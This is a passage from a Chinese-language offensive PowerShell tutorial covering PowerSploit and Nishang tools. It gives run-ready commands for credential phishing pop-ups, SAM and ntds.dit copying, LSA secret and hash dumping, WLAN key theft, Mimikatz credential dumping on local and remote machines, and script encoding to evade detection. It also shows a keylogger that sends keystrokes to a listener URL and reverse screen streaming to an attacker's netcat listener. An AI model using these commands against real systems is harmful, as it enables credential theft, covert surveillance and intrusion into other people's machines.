**示例**
**扫描192.168.1.1/24的135,139,445端口**
    Invoke-Portscan -Hosts 192.168.1,1 -Ports "135,139,445,1" -Threads 50
**扫描Top50的端口**
    Invoke-Portscan -Hosts 192.168.1.1 -TopPorts 50 -Threads 50
**扫描前不ping目标主机**
    Invoke-Portscan -Hosts 192.168.169.168 -Ports 445 -SkipDiscovery
#### Invoke-ReverseDnsLookup
ip反查主机名
**示例**
    Invoke-ReverseDnsLookup -IpRange 192.168.1.1-192.168.1.254
#### PowerView
同mayhem放置位置
**参考**
> 
> 
> 
>  series-3/> series-4/>
### ScriptModification
#### Out-CompressedDll
将dll压缩并base64编码
**示例**
    Out-CompressedDll -FilePath test.dll
#### Out-EncodedCommand
将脚本或代码块编码
**示例** **脚本块编码**
    Out-EncodedCommand -ScriptBlock {write-host 'whoami'}
**脚本编码**
    Out-EncodedCommand -Path .\1.ps1 -WindowStyle Hidden
#### Out-EncryptedScript
脚本加密
**示例**
    Out-EncryptedScript -ScriptPath .\1.ps1 -Password fuck -Salt 123 -FilePath .\encrypt.ps1
#### Remove-Comments
删除注释和不必要的空白符
**示例**
    Remove-Comments -Path .\1.ps1
    Remove-Comments -ScriptBlock { whoami }
## Nishang
下面Nishang的介绍，朋友[V1ct0r](https://github.com/lwhv1ct0r/)对于Nishang的总结不错，这里争取同意之后一起发给大家查看。
### 0.信息搜集
#### Check-VM
从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare,
Virtual PC, Virtual Box,Xen,QEMU）来识别。 执行方式：
    PS > Check-VM
测试
#### Copy-VSS
这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM
hive也能被拷贝出来。 执行方式：
    PS > Copy-VSS //将会直接把文件保存在当前路径下
    PS > Copy-VSS -DestinationDir C:\temp  //指定保存文件的路径（必须是已经存在的路径）
测试
#### Invoke-CredentialsPhish
这个脚本是用来欺骗用户输入账号密码信息的。 执行方式：
    PS > Invoke-CredentialsPhish
测试
执行后会弹出这个框欺骗用户输入
直到用户输入正确后这个框才会消失，然后我们就可以得到明文的管理员账号密码：
#### FireBuster FireListener
FireBuster可以对内网进行扫描，它会把包发给FireListener 执行方式：
    PS > FireBuster 10.10.10.10 1000-1020
    PS > FireListener -portrange 1000-1020
该脚本作者的Github上面还提供了一个Python版的监听端： 测试 我们首先在我们的机器（Attacker）上面运行FireListener：
    FireListener 100-110
Victim：
    FireBuster 192.168.199.1 90-110 -Verbose
#### Get-Information
这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）。 执行方式：
    PS > Get-Information
还可以用我们前面说过的Out-File来将运行结果保存到指定文件。
#### Get-LSASecret
该脚本可以获取LSA信息，但是使用的前提当然是你已经成功提升了权限的情况下，通常和我们后面提权当中涉及到的Enable-DuplicateToken（帮助我们获得System权限）联合使用。 执行方式：
    PS > Enable-DuplicateToken
    PS > Get-LsaSecret
    PS > Get-LsaSecret -RegistryKey KeyName //还可以指定键名
#### Get-PassHashes
这个脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。
执行方式：
    PS > Get-PassHashes -PSObjectFormat //可以使用-PSObjectFormat来格式化输出结果
#### Get-WLAN-Keys
在Administrator的权限下，可以利用这个脚本来dump出WLAN文件的密钥信息。实质上，这个脚本就是利用了netsh wlan show
profile name=”” key=clear来获取。 执行方式：
    PS > Get-WLAN-Keys
#### Keylogger
Keylogger可以保存下用户的键盘记录。 执行方式：
    PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis  //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。
    PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器
    PS > .\Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）
    PS > .\Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中
测试 首先执行 PS > .\Keylogger.ps1
发现在当前用户的Temp目录下生成了Key的文件，这时我们使用nishang Utility中的Parse_Keys来解析
    PS >Parse_Keys .\key.log .\parsed.txt
然后parsed.txt里面就是解析后的按键记录了
#### Invoke-MimikatzWdigestDowngrade
Dump出Windows 8.1 and Server 2012的系统用户密码。 执行方式：
    PS >Invoke-MimikatzWDigestDowngrade
    PS > Get-Job | Receive-Job
执行了
    PS >Invoke-MimikatzWDigestDowngrade
Windows会锁屏
之后执行
    Get-Job
发现尝试多次都测试失败
解决办法可以参考： [域渗透——Dump Clear-Text Password after KB2871997
installed](http://www.myhack58.com/Article/html/3/62/2016/75903.htm)
#### Get-PassHints
这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive。 执行方式：
    PS > Get-PassHints
#### Show-TargetScreen
使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者Powercat来进行监听。在本地使用支持MJPEG的浏览器（如：Firefox）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。
    PS > Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443  //将远程的画面传送到192.168.230.1的443端口
测试 Victim：
    Show-TargetScreen -IPAddres 192.168.199.127 -Port 5773 -Reverse
Attacker：
    nc.exe -nlvp 5773 | nc.exe -nlvp 9000 //这里我使用的NC，也可以用Powercat
本机访问：127.0.0.1:9000
#### Invoke-Mimikatz
Mimikatz大家都非常熟悉了，就不再介绍了 执行方式：
    Invoke-Mimikatz -DumpCerts //Dump出本机的凭证信息
    Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2") //Dump出远程两台计算机的凭证信息
    Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1" //在远程一台机器上运行Mimikatz并执行"privilege::debug exit"
### 1.域相关脚本
#### Get-Unconstrained
查找域内开启了Kerberos Unconstrained Delegation的机器。 执行方式：
    PS > Get-Unconstrained //返回开启的计算机名
    PS > Get-Unconstrained -Details  //返回更详细的信息
关于”通过Kerberos Unconstrained
Delegation获取到域管理员”：
### 2.Antak Webshell